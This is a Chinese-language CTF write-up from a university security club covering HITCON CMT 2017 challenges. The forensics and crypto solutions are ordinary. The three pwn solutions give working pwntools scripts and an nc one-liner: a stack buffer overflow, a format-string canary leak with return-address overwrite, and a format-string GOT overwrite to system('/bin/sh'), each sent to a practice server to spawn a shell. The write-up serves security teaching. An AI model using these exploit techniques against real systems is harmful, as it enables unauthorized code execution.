---
title: HITCON CMT 2017
date: 2017-08-27 23:05:00
tags:
  - club
---

# HITCON CMT 2017 社群議程 投影片

[Speaker Deck](https://speakerdeck.com/oalieno/shen-tou-ce-shi-ji-ben-ji-qiao-yu-jing-yan-fen-xiang)
[SlideShare](https://www.slideshare.net/ssuserd44fa2/ss-79172936)

# HITCON CMT 2017 闖關題目 writeups

## [FORENSICS-100](https://bamboofox.cs.nctu.edu.tw/courses/3/challenges/59)
1. 題目說圖片被剪裁過，另外圖片的名稱是 `height_is_weird.png`，因此可以推測是高度被裁減過，需要改 png header 中的高度，讓不見的 flag 被顯現出來
2. 需要了解 png 的編碼方式，找到圖片高度在 header 裡的位置，可以參考[這裡](http://blog.csdn.net/hherima/article/details/45847043)
3. 由 png 協定可知，圖中的 35A 與 152 分別為此圖的寬與高
    ![](https://i.imgur.com/BXIel9j.png)

4. 運用一些可以直接修改檔案真正的值的軟體 ( 如 : hexedit )，對 152 做竄改，將數值調高

**這題要注意的是，出題者改高度沒有重新計算 CRC 檢驗碼，是想讓大家發現圖片有被改過的跡象，有些圖片解碼器對 png 做的 check 比較嚴格 ( ex. Mac 的預覽程式 )，可能會出現高度調超過真實高度或是發現 CRC 檢驗碼不正確會 crash 或完全不能讀的狀況(也就是你完全讀不了下載出來的檔案 @@)**

## [PWN-100](https://bamboofox.cs.nctu.edu.tw/courses/3/challenges/60)

這題是最基礎的 buffer overflow 題目

### 解題思路 :
目標是讓 to_be_overflow 等於 0xABCD1234 而拿到 shell
我們可以在原始碼中看到 `char text[40];` 和 `int to_be_overflowed` 是接在一起的
但是我們怎麼確認他們在記憶體上真的接在一起呢?

![objdump](https://i.imgur.com/1fCBCU7.png)

我們先用 objdump 來看一下 assembly ( 其他可以看 assembly 的工具都可以用喔 )

```assembly
lea eax,[ebp-0x34]
push eax
```

這行是在 call gets 函式之前把 gets 的參數放到 stack 的行為
對照原始碼就可以發現 ebp-0x34 就是我們的 text 在 stack 上的位址

```assembly
cmp DWORD PTR [ebp-0xc],0xabcd1234
```

這行等於是原始碼的 `if(to_be_overflowed == 0xabcd1234)`
所以 ebp-0xc 就是我們的 to_be_overflowed 的位址
`0x34 - 0xc = 0x28 = 40` 剛剛好他們之間的距離就是 text 這個陣列的大小，也就代表他們真的緊鄰依偎著彼此直到~~世界~~程式的終結

既然他們依偎在一起，而且 gets 這個函式不會檢查輸入的字串有多長 ( buffer overflow 的核心想法 )
那我們只要先輸入 40 個字，然後不按 Enter，再繼續輸入下去的字就會剛好蓋到 to_be_overflowed

### 需要注意的小地方

1. 是 [little endian](https://zh.wikipedia.org/wiki/字节序) 喔
2. 恩

### 程式碼

```python=
from pwn import *

useless = 0xABCD1234
offset = 40

payload = "A" * offset + p32(0xABCD1234)

r = remote('bamboofox.cs.nctu.edu.tw',22001)
r.sendline(payload)
r.interactive()
```

使用好用的 [pwntools](https://github.com/Gallopsled/pwntools) 做連線送 payload

```bash
( python -c "print 'A' * 40 + chr(0x34) + chr(0x12) + chr(0xCD) + chr(0xAB)" ; cat ) | nc bamboofox.cs.nctu.edu.tw 22001
```

直接把字元印出來 pipe 到 nc 指令
後面的 cat 是為了能讓你跟你拿到的 shell 互動
因為 cat 這個指令本身直接用不接檔案會像是一個 echo server，也就是你打什麼 cat 回什麼
然後再 pipe 到後面的 nc 就形成一個完美的互動式介面

## [PWN-200](https://bamboofox.cs.nctu.edu.tw/courses/3/challenges/61)
這題是一題簡單 format string + buffer overflow 的應用
可以參考我們的[社課連結](https://youtu.be/FvGhDlK36PI)

### 觀察

1. 先看一下原始碼，如果我們能跳去執行 `canary_protect_me` 這個函式，我們就可以拿到 shell 了
2. 這題有開 [canary 保護](http://yunnigu.dropsec.xyz/2017/03/20/Liunx%E4%B8%8B%E5%85%B3%E4%BA%8E%E7%BB%95%E8%BF%87cancry%E4%BF%9D%E6%8A%A4%E6%80%BB%E7%BB%93/)
3. 原始碼中出現 `printf(buf);`，存在 format string 的漏洞

### 解題思路

先用 format string 漏洞 leak 出 canary，就可以用 buffer overflow 蓋掉 return address 進而跳到 canary_protect_me 這個函式成功拿到 shell

### 程式碼

```python
from pwn import *

r = remote('bamboofox.cs.nctu.edu.tw',22002)

func = 0x0804854d
r.sendline('%15$x')
canary = int(r.recv(), 16)

payload = 'A'*40 + p32(canary) + 'B'*12 + p32(func)

r.sendline(payload)
r.interactive()
```

## [PWN-300](https://bamboofox.cs.nctu.edu.tw/courses/3/challenges/62)

這題同樣有 format string 的漏洞，第一次 gets, printf 用 format string 把 printf 的 GOT 蓋成 system 的函式位址，第二次 gets, printf 直接輸入 `/bin/sh` 就等於是，`system("/bin/sh")`

```python
from pwn import *

printf_got = 0x804a00c
system_plt_high = 0x0804
system_plt_low  = 0x8410
offset = 7

payload = p32(printf_got+2)
payload += p32(printf_got)
payload += "%{}c%{}$hn".format(system_plt_high - 8, offset)
payload += "%{}c%{}$hn".format(system_plt_low - system_plt_high, offset+1)

r = remote('bamboofox.cs.nctu.edu.tw', 22003)

r.sendline(payload)
r.interactive()
```

## [CRYPTO-100](https://bamboofox.cs.nctu.edu.tw/courses/3/challenges/64)
解題可以寫 python script 或直接用[線上工具](http://temp.crypo.com/) (應該是最簡單的一題 XD)
1. 看到很多 0101，猜測是 binary，try 一下應該是什麼的 binary，這題是 ascii 的 binary
2. 發現新字串有 `=` 結尾，猜測是 base64 的 padding
3. base64 decrype 完後，找到 `BBAMOOOF#X{cpR-Y}.T0`，因為有提示 轉置密碼 & FLAG 的形式是 : BAMBOOFOX{未知字串}，所以要找幾個字元一組
4. 發現四個字元一組 && encrypt role 是 [1,2,3,0] => 切開來做旋轉，即可找到 Flag
